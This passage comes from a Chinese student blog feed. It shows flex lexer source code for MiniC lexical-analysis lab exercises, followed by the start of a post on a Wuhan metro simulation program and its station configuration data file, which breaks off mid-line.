<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;def.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> yycolumn;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYSTYPE yylval</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flexout</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> name,<span class="built_in">std</span>::<span class="built_in">string</span> value)</span></span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;\t:&quot;</span>&lt;&lt;value&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//flex为bison提供行号信息</span></span><br><span class="line">%&#125;</span><br><span class="line">%option yylineno</span><br><span class="line">ID [A-Za-z]*</span><br><span class="line">INT [<span class="number">0</span><span class="number">-7</span>]+ <span class="comment">//8进制数</span></span><br><span class="line">SIXTEEN <span class="string">&quot;0x&quot;</span>[<span class="number">0</span><span class="number">-9</span>A-F]+ <span class="comment">//16进制数</span></span><br><span class="line">ERRORTYPEMC <span class="string">&quot;~&quot;</span>  <span class="comment">//非法字符</span></span><br><span class="line">ERRORTYPEHEX <span class="number">0</span>x[<span class="number">0</span><span class="number">-9</span>A-Z]*[G-Z]+[<span class="number">0</span><span class="number">-9</span>A-Z]*  <span class="comment">//非法16进制</span></span><br><span class="line">ERRORTYPEOCT [<span class="number">0</span><span class="number">-7</span>]*[<span class="number">8</span><span class="number">-9</span>]+[<span class="number">0</span><span class="number">-7</span>]* <span class="comment">//非法8进制</span></span><br><span class="line">FLOAT [<span class="number">0</span><span class="number">-9</span>]+[<span class="number">0</span><span class="number">-9</span>]*<span class="string">&quot;.&quot;</span>[<span class="number">0</span><span class="number">-9</span>]*|[<span class="number">1</span><span class="number">-9</span>]+[<span class="number">0</span><span class="number">-9</span>]*<span class="string">&quot;.&quot;</span>[<span class="number">0</span><span class="number">-9</span>]*<span class="string">&quot;e&quot;</span>[<span class="number">0</span><span class="number">-9</span>|-]+</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;int&quot;</span>        &#123;flexout(<span class="string">&quot;TYPE&quot;</span>,<span class="string">&quot;int&quot;</span>);&#125;</span><br><span class="line"><span class="string">&quot;float&quot;</span>      &#123;flexout(<span class="string">&quot;TYPE&quot;</span>,<span class="string">&quot;float&quot;</span>);&#125;</span><br><span class="line"><span class="string">&quot;char&quot;</span>      &#123;flexout(<span class="string">&quot;TYPE&quot;</span>,<span class="string">&quot;char&quot;</span>);&#125;</span><br><span class="line"><span class="string">&quot;if&quot;</span>       &#123;flexout(<span class="string">&quot;IF&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;FLOAT&#125;     &#123;flexout(<span class="string">&quot;FLOAT&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;INT&#125;   &#123;flexout(<span class="string">&quot;INT&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;SIXTEEN&#125;  &#123;flexout(<span class="string">&quot;INT&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ERRORTYPEMC&#125;  &#123;<span class="built_in">printf</span>(<span class="string">&quot;Error type A at Line %d: Mysterious characters &#x27;%s&#x27;\n&quot;</span>,yylineno,yytext);&#125;</span><br><span class="line">&#123;ERRORTYPEHEX&#125; &#123;<span class="built_in">printf</span>(<span class="string">&quot;Error type A at Line %d: Illegal hexadecimal number &#x27;%s&#x27;\n&quot;</span>,yylineno,yytext);&#125;</span><br><span class="line">&#123;ERRORTYPEOCT&#125; &#123;<span class="built_in">printf</span>(<span class="string">&quot;Error type A at Line %d: Illegal octal number &#x27;%s&#x27;\n&quot;</span>,yylineno,yytext);&#125;</span><br><span class="line"><span class="string">&quot;;&quot;</span>  &#123;flexout(<span class="string">&quot;SEMI&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;,&quot;</span>  &#123;flexout(<span class="string">&quot;COMMA&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;==&quot;</span>  &#123;flexout(<span class="string">&quot;RELOP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;=&quot;</span>  &#123;flexout(<span class="string">&quot;ASSIGNOP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;+&quot;</span>  &#123;flexout(<span class="string">&quot;PLUS&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;-&quot;</span>  &#123;flexout(<span class="string">&quot;MINUS&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;*&quot;</span>  &#123;flexout(<span class="string">&quot;STAR&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;/&quot;</span>  &#123;flexout(<span class="string">&quot;DIV&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span> &#123;flexout(<span class="string">&quot;AND&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;|&quot;</span>  &#123;flexout(<span class="string">&quot;OR&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;.&quot;</span>  &#123;flexout(<span class="string">&quot;DOT&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;!&quot;</span>  &#123;flexout(<span class="string">&quot;NOT&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;(&quot;</span>  &#123;flexout(<span class="string">&quot;LP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;)&quot;</span>  &#123;flexout(<span class="string">&quot;RP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;[&quot;</span>  &#123;flexout(<span class="string">&quot;LB&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;]&quot;</span>  &#123;flexout(<span class="string">&quot;RB&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;&#123;&quot;</span>  &#123;flexout(<span class="string">&quot;LC&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span>  &#123;flexout(<span class="string">&quot;RC&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;struct&quot;</span>  &#123;flexout(<span class="string">&quot;STRUCT&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;return&quot;</span>  &#123;flexout(<span class="string">&quot;RETURN&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;else&quot;</span>  &#123;flexout(<span class="string">&quot;ELSE&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;while&quot;</span>  &#123;flexout(<span class="string">&quot;WHILE&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ID&#125;    &#123;flexout(<span class="string">&quot;ID&quot;</span>,yytext);&#125;</span><br><span class="line"></span><br><span class="line">[\n]		&#123;yycolumn=<span class="number">1</span>;&#125;</span><br><span class="line">[ \r\t]		&#123;<span class="comment">/*printf(&quot;过滤空格等字符\n&quot;);*/</span>&#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第三关flex-minic词法分析三"><a class="markdownIt-Anchor" href="#第三关flex-minic词法分析三"></a> 第三关：Flex minic词法分析（三）</h4>
<p>简单的添加4个符号定义，对于词法分析器的优先级（从上往下）理解。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;def.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> yycolumn;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYSTYPE yylval</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flexout</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> name,<span class="built_in">std</span>::<span class="built_in">string</span> value)</span></span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;\t:&quot;</span>&lt;&lt;value&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//flex为bison提供行号信息</span></span><br><span class="line">%&#125;</span><br><span class="line">%option yylineno</span><br><span class="line">ID [A-Za-z]*</span><br><span class="line">INT [<span class="number">0</span><span class="number">-7</span>]+</span><br><span class="line">SIXTEEN <span class="string">&quot;0x&quot;</span>[<span class="number">0</span><span class="number">-9</span>A-F]+</span><br><span class="line">ERRORTYPEMC <span class="string">&quot;~&quot;</span></span><br><span class="line">ERRORTYPEHEX <span class="number">0</span>x[<span class="number">0</span><span class="number">-9</span>A-Z]*[G-Z]+[<span class="number">0</span><span class="number">-9</span>A-Z]*</span><br><span class="line">ERRORTYPEOCT [<span class="number">0</span><span class="number">-7</span>]*[<span class="number">8</span><span class="number">-9</span>]+[<span class="number">0</span><span class="number">-7</span>]*</span><br><span class="line">FLOAT [<span class="number">0</span><span class="number">-9</span>]+[<span class="number">0</span><span class="number">-9</span>]*<span class="string">&quot;.&quot;</span>[<span class="number">0</span><span class="number">-9</span>]*|[<span class="number">1</span><span class="number">-9</span>]+[<span class="number">0</span><span class="number">-9</span>]*<span class="string">&quot;.&quot;</span>[<span class="number">0</span><span class="number">-9</span>]*<span class="string">&quot;e&quot;</span>[<span class="number">0</span><span class="number">-9</span>|-]+</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;int&quot;</span>        &#123;flexout(<span class="string">&quot;TYPE&quot;</span>,<span class="string">&quot;int&quot;</span>);&#125;</span><br><span class="line"><span class="string">&quot;float&quot;</span>      &#123;flexout(<span class="string">&quot;TYPE&quot;</span>,<span class="string">&quot;float&quot;</span>);&#125;</span><br><span class="line"><span class="string">&quot;char&quot;</span>      &#123;flexout(<span class="string">&quot;TYPE&quot;</span>,<span class="string">&quot;char&quot;</span>);&#125;</span><br><span class="line"><span class="string">&quot;if&quot;</span>       &#123;flexout(<span class="string">&quot;IF&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;FLOAT&#125;     &#123;flexout(<span class="string">&quot;FLOAT&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;INT&#125;   &#123;flexout(<span class="string">&quot;INT&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;SIXTEEN&#125;  &#123;flexout(<span class="string">&quot;INT&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ERRORTYPEMC&#125;  &#123;<span class="built_in">printf</span>(<span class="string">&quot;Error type A at Line %d: Mysterious characters &#x27;%s&#x27;\n&quot;</span>,yylineno,yytext);&#125;</span><br><span class="line">&#123;ERRORTYPEHEX&#125; &#123;<span class="built_in">printf</span>(<span class="string">&quot;Error type A at Line %d: Illegal hexadecimal number &#x27;%s&#x27;\n&quot;</span>,yylineno,yytext);&#125;</span><br><span class="line">&#123;ERRORTYPEOCT&#125; &#123;<span class="built_in">printf</span>(<span class="string">&quot;Error type A at Line %d: Illegal octal number &#x27;%s&#x27;\n&quot;</span>,yylineno,yytext);&#125;</span><br><span class="line"><span class="string">&quot;;&quot;</span>  &#123;flexout(<span class="string">&quot;SEMI&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;,&quot;</span>  &#123;flexout(<span class="string">&quot;COMMA&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;==&quot;</span>  &#123;flexout(<span class="string">&quot;RELOP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;=&quot;</span>  &#123;flexout(<span class="string">&quot;ASSIGNOP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;++&quot;</span>  &#123;flexout(<span class="string">&quot;PLUSPLUS&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;+=&quot;</span>  &#123;flexout(<span class="string">&quot;PLUSASS&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;+&quot;</span>  &#123;flexout(<span class="string">&quot;PLUS&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;--&quot;</span>  &#123;flexout(<span class="string">&quot;MINUSMINUS&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;-=&quot;</span>  &#123;flexout(<span class="string">&quot;MINUSASS&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;-&quot;</span>  &#123;flexout(<span class="string">&quot;MINUS&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;*&quot;</span>  &#123;flexout(<span class="string">&quot;STAR&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;/&quot;</span>  &#123;flexout(<span class="string">&quot;DIV&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span> &#123;flexout(<span class="string">&quot;AND&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;|&quot;</span>  &#123;flexout(<span class="string">&quot;OR&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;.&quot;</span>  &#123;flexout(<span class="string">&quot;DOT&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;!&quot;</span>  &#123;flexout(<span class="string">&quot;NOT&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;(&quot;</span>  &#123;flexout(<span class="string">&quot;LP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;)&quot;</span>  &#123;flexout(<span class="string">&quot;RP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;[&quot;</span>  &#123;flexout(<span class="string">&quot;LB&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;]&quot;</span>  &#123;flexout(<span class="string">&quot;RB&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;&#123;&quot;</span>  &#123;flexout(<span class="string">&quot;LC&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span>  &#123;flexout(<span class="string">&quot;RC&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;struct&quot;</span>  &#123;flexout(<span class="string">&quot;STRUCT&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;return&quot;</span>  &#123;flexout(<span class="string">&quot;RETURN&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;else&quot;</span>  &#123;flexout(<span class="string">&quot;ELSE&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;while&quot;</span>  &#123;flexout(<span class="string">&quot;WHILE&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ID&#125;    &#123;flexout(<span class="string">&quot;ID&quot;</span>,yytext);&#125;</span><br><span class="line"></span><br><span class="line">[\n]		&#123;yycolumn=<span class="number">1</span>;&#125;</span><br><span class="line">[ \r\t]		&#123;<span class="comment">/*printf(&quot;过滤空格等字符\n&quot;);*/</span>&#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>实验</category>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>武汉地铁模拟系统</title>
    <url>/2021/11/17/%E6%AD%A6%E6%B1%89%E5%9C%B0%E9%93%81%E6%A8%A1%E6%8B%9F%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<hr />
<p>效果预览：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211117231356.png" alt="武汉地铁模拟" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211117231452.png" alt="路径日志" /></p>
<hr />
<h3 id="站点配置源文件"><a class="markdownIt-Anchor" href="#站点配置源文件"></a> 站点配置源文件</h3>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>S</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>t</mi><mi>x</mi><mi>t</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Station.txt\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord">.</span><span class="mord mathdefault">t</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">径河站 1 1 1 1 0 1.24 1 2</span><br><span class="line">三店站 1 2 2 1 0 1.24 1 1 1 0 1.24 1 3</span><br><span class="line">码头潭公园站 1 3 4 1 0 1.24 1 2 1 0 1.24 1 4 6 1 1.34 6 1 6 1 1.34 6 3</span><br><span class="line">东吴大道站 1 4 2 1 0 1.24 1 3 1 0 1.24 1 5</span><br><span class="line">五环大道站 1 5 2 1 0 1.24 1 4 1 0 1.24 1 6</span><br><span class="line">额头湾站 1 6 2 1 0 1.24 1 5 1 0 1.24 1 7</span><br><span class="line">竹叶海站 1 7 2 1 0 1.24 1 6 1 0 1.24 1 8</span><br><span class="line">舵落口站 1 8 2 1 0 1.24 1 7 1 0 1.24 1 9</span><br><span class="line">古田一路站 1 9 2 1 0 1.24 1 8 1 0 1.24 1 10</span><br><span class="line">古田二路站 1 10 2 1 0 1.24 1 9 1 0 1.24 1 11</span><br><span class="line">古田三路站 1 11 2 1 0 1.24 1 10 1 0 1.24 1 12</span><br><span class="line">古田四路站 1 12 2 1 0 1.24 1 11 1 0 1.24 1 13</span><br><span class="line">汉西一路站 1 13 2 1 0 1.24 1 12 1 0 1.24 1 14</span><br><span class="line">宗关站 1 14 4 1 0 1.24 1 13 1 0 1.24 1 15 3 1 1.30 3 14 3 1 1.30 3 16</span><br><span class="line">太平洋站 1 15 2 1 0 1.24 1 14 1 0 1.24 1 16</span><br><span class="line">硚口路站 1 16 2 1 0 1.24 1 15 1 0 1.24 1 17</span><br><span class="line">崇仁路站 1 17 2 1 0 1.24 1 16 1 0 1.24 1 18</span><br><span class="line">利济北路站 1 18 2 1 0 1.24 1 17 1 0 1.24 1 19</span><br><span class="line">友谊路站 1 19 2 1 0 1.24 1 18 1 0 1.24 1 20</span><br><span class="line">循礼门站 1 20 4 1 0 1.24 1 19 1 0 1.24 1 21 2 1 1.64 2 15 2 1 1.64 2 17</span><br><span class="line">大智路站 1 21 4 1 0 1.24 1 20 1 0 1.24 1 22 6 1 1.34 6 16 6 1 1.34 6 18</span><br><span class="line">三阳路站 1 22 4 1 0 1.24 1 21 1 0 1.24 1 23 7 1 2.33 7 18 7 1 2.33 7 20</span><br><span class="line">黄浦路站 1 23 4 1 0 1.24 1 22 1 0 1.24 1 24 8 1 1.36 8 6 8 1 1.36 8 8</span><br><span class="line">头道街站 1 24 2 1 0 1.24 1 23 1 0 1.24 1 25</span><br><span class="line">二七路站 1 25 2 1 0 1.24 1 24 1 0 1.24 1 26</span><br><span class="line">徐州新村站 1 26 2 1 0 1.24 1 25 1 0 1.24 1 27</span><br><span class="line">丹水池站 1 27 2 1 0 1.24 1 26 1 0 1.24 1 28</span><br><span class="line">新荣站 1 28 2 1 0 1.24 1 27 1 0 1.24 1 29</span><br><span class="line">堤角站 1 29 2 1 0 1.24 1 28 1 0 1.24 1 30</span><br><span class="line">滕子岗站 1 30 2 1 0 1.24 1 29 1 0 1.24 1 31</span><br><span class="line">滠口新城站 1 31 2 1 0 1.24 1 30 1 0 1.24 1 32</span><br><span class="line">汉口北站 1 32 1 1 0 1.24 1 31</span><br><span class="line">天河机场站 2 1 1 2 0 1.64 2 2</span><br><span class="line">航空总部站 2 2 2 2 0 1.64 2 1 2 0 1.64 2 3</span><br><span class="line">宋家岗站 2 3 2 2 0 1.64 2 2 2 0 1.64 2 4</span><br><span class="line">巨龙大道站 2 4 4 2 0 1.64 2 3 2 0 1.64 2 5 7 1 2.33 7 8 7 1 2.33 7 10</span><br><span class="line">盘龙城站 2 5 2 2 0 1.64 2 4 2 0 1.64 2 6</span><br><span class="line">宏图大道站 2 6 5 2 0 1.64 2 5 2 0 1.64 2 7 3 1 1.30 3 2 8 1 1.36 8 1 8 1 1.36 8 3</span><br><span class="line">常青城站 2 7 2 2 0 1.64 2 6 2 0 1.64 2 8</span><br><span class="line">金银潭站 2 8 2 2 0 1.64 2 7 2 0 1.64 2 9</span><br><span class="line">常青花园站 2 9 4 2 0 1.64 2 8 2 0 1.64 2 10 6 1 1.34 6 9 6 1 1.34 6 11</span><br><span class="line">长港路站 2 10 2 2 0 1.64 2 9 2 0 1.64 2 11</span><br><span class="line">汉口火车站 2 11 2 2 0 1.64 2 10 2 0 1.64 2 12</span><br><span class="line">范湖站 2 12 4 2 0 1.64 2 11 2 0 1.64 2 13 3 1 1.30 3 10 3 1 1.30 3 12</span><br><span class="line">王家墩东站 2 13 4 2 0 1.64 2 12 2 0 1.64 2 14 7 1 2.33 7 15 7 1 2.33 7 17</span><br><span class="line">青年路站 2 14 2 2 0 1.64 2 13 2 0 1.64 2 15</span><br><span class="line">中山公园站 2 15 2 2 0 1.64 2 14 2 0 1.64 2 16</span><br><span class="line">循礼门站 2 16 4 2 0 1.64 2 15 2 0 1.64 2 17 1 1 1.24 1 19 1 1 1.24 1 21</span><br><span class="line">江汉路站 2 17 4 2 0 1.64 2 16 2 0 1.64 2 18 6 1 1.34 6 17 6 1 1.34 6 19</span><br><span class="line">积玉桥站 2 18 2 2 0 1.64 2 17 2 0 1.64 2 19</span><br><span class="line">螃蟹岬站 2 19 4 2 0 1.64 2 18 2 0 1.64 2 20 7 1 2.33 7 22 7 1 2.33 7 24</span><br><span class="line">小龟山站 2 20 2 2 0 1.64 2 19 2 0 1.64 2 21</span><br><span class="line">洪山广场站 2 21 4 2 0 1.64 2 20 2 0 1.64 2 22 4 1 1.35 4 11 4 1 1.35 4 13</span><br><span class="line">中南路站 2 22 4 2 0 1.64 2 21 2 0 1.64 2 23 4 1 1.35 4 12 4 1 1.35 4 14</span><br><span class="line">宝通寺站 2 23 2 2 0 1.64 2 22 2 0 1.64 2 24</span><br><span class="line">街道口站 2 24 4 2 0 1.64 2 23 2 0 1.64 2 25 8 1 1.36 8 17 8 1 1.36 8 19</span><br><span class="line">广埠屯站 2 25 2 2 0 1.64 2 24 2 0 1.64 2 26</span><br><span class="line">虎泉站 2 26 2 2 0 1.64 2 25 2 0 1.64 2 27</span><br><span class="line">杨家湾站 2 27 2 2 0 1.64 2 26 2 0 1.64 2 28</span><br><span class="line">光谷广场站 2 28 2 2 0 1.64 2 27 2 0 1.64 2 29</span><br><span class="line">珞雄路站 2 29 2 2 0 1.64 2 28 2 0 1.64 2 30</span><br><span class="line">华中科技大学站 2 30 2 2 0 1.64 2 29 2 0 1.64 2 31</span><br><span class="line">光谷大道站 2 31 2 2 0 1.64 2 30 2 0 1.64 2 32</span><br><span class="line">佳园路站 2 32 2 2 0 1.64 2 31 2 0 1.64 2 33</span><br><span class="line">光谷火车站 2 33 2 2 0 1.64 2 32 2 0 1.64 2 34</span><br><span class="line">黄龙山路站 2 34 2 2 0 1.64 2 33 2 0 1.64 2 35</span><br><span class="line">金融港北站 2 35 2 2 0 1.64 2 34 2 0 1.64 2 36</span><br><span class="line">秀湖站 2 36 2 2 0 1.64 2 35 2 0 1.64 2 37</span><br><span class="line">藏龙东街站 2 37 2 2 0 1.64 2 36 2 0 1.64 2 38</span><br><span class="line">佛祖岭站 2 38 1 2 0 1.64 2 37</span><br><span class="line">宏图大道站 3 1 5 3 0 1.30 3 2 2 1 1.64 2 5 2 1 1.64 2 7 8 1 1.36 8 1 8 1 1.36 8 3</span><br><span class="line">市民之家站 3 2 2 3 0 1.30 3 1 3 0 1.30 3 3</span><br><span class="line">后湖大道站 3 3 2 3 0 1.30 3 2 3 0 1.30 3 4</span><br><span class="line">兴业路站 3 4 2 3 0 1.30 3 3 3 0 1.30 3 5</span><br><span class="line">二七小路站 3 5 2 3 0 1.30 3 4 3 0 1.30 3 6</span><br><span class="line">罗家庄站 3 6 2 3 0 1.30 3 5 3 0 1.30 3 7</span><br><span class="line">赵家条站 3 7 4 3 0 1.30 3 6 3 0 1.30 3 8 8 1 1.36 8 5 8 1 1.36 8 7</span><br><span class="line">惠济二路站 3 8 2 3 0 1.30 3 7 3 0 1.30 3 9</span><br><span class="line">香港路站 3 9 6 3 0 1.30 3 8 3 0 1.30 3 10 6 1 1.34 6 14 6 1 1.34 6 16 7 1 2.33 7 17 7 1 2.33 7 19</span><br><span class="line">菱角湖站 3 10 2 3 0 1.30 3 9 3 0 1.30 3 11</span><br><span class="line">范湖站 3 11 4 3 0 1.30 3 10 3 0 1.30 3 12 2 1 1.64 2 11 2 1 1.64 2 13</span><br><span class="line">云飞路站 3 12 2 3 0 1.30 3 11 3 0 1.30 3 13</span><br><span class="line">武汉商务区站 3 13 4 3 0 1.30 3 12 3 0 1.30 3 14 7 1 2.33 7 14 7 1 2.33 7 16</span><br><span class="line">双墩站 3 14 2 3 0 1.30 3 13 3 0 1.30 3 15</span><br><span class="line">宗关站 3 15 4 3 0 1.30 3 14 3 0 1.30 3 16 1 1 1.24 1 13 1 1 1.24 1 15</span><br><span class="line">王家湾站 3 16 4 3 0 1.30 3 15 3 0 1.30 3 17 4 1 1.35 4 23 4 1 1.35 4 25</span><br><span class="line">龙阳村站 3 17 2 3 0 1.30 3 16 3 0 1.30 3 18</span><br><span class="line">陶家岭站 3 18 2 3 0 1.30 3 17 3 0 1.30 3 19</span><br><span class="line">四新大道站 3 19 2 3 0 1.30 3 18 3 0 1.30 3 20</span><br><span class="line">汉阳客运站 3 20 2 3 0 1.30 3 19 3 0 1.30 3 21</span><br><span class="line">三角湖站 3 21 2 3 0 1.30 3 20 3 0 1.30 3 22</span><br><span class="line">体育中心站 3 22 2 3 0 1.30 3 21 3 0 1.30 3 23</span><br><span class="line">东风公司站 3 23 3 3 0 1.30 3 22 3 0 1.30 3 24 6 1 1.34 6 31</span><br><span class="line">沌阳大道站 3 24 1 3 0 1.30 3 23</span><br><span class="line">武汉火车站站 4 1 1 4 0 1.35 4 2</span><br><span class="line">杨春湖站 4 2 2 4 0 1.35 4 1 4 0 1.35 4 3</span><br><span class="line">工业四路站 4 3 2 4 0 1.35 4 2 4 0 1.35 4 4</span><br><span class="line">仁和路站 4 4 2 4 0 1.35 4 3 4 0 1.35 4 5</span><br><span class="line">园林路站 4 5 2 4 0 1.35 4 4 4 0 1.35 4 6</span><br><span class="line">罗家港站 4 6 2 4 0 1.35 4 5 4 0 1.35 4 7</span><br><span class="line">铁机路站 4 7 2 4 0 1.35 4 6 4 0 1.35 4 8</span><br><span class="line">岳家嘴站 4 8 4 4 0 1.35 4 7 4 0 1.35 4 9 8 1 1.36 8 10 8 1 1.36 8 12</span><br><span class="line">东亭站 4 9 2 4 0 1.35 4 8 4 0 1.35 4 10</span><br><span class="line">青鱼嘴站 4 10 2 4 0 1.35 4 9 4 0 1.35 4 11</span><br><span class="line">楚河汉街站 4 11 2 4 0 1.35 4 10 4 0 1.35 4 12</span><br><span class="line">洪山广场站 4 12 4 4 0 1.35 4 11 4 0 1.35 4 13 2 1 1.64 2 20 2 1 1.64 2 22</span><br><span class="line">中南路站 4 13 4 4 0 1.35 4 12 4 0 1.35 4 14 2 1 1.64 2 21 2 1 1.64 2 23</span><br><span class="line">梅苑小区站 4 14 2 4 0 1.35 4 13 4 0 1.35 4 15</span><br><span class="line">武昌火车站站 4 15 4 4 0 1.35 4 14 4 0 1.35 4 16 7 1 2.33 7 24 7 1 2.33 7 26</span><br><span class="line">首义路站 4 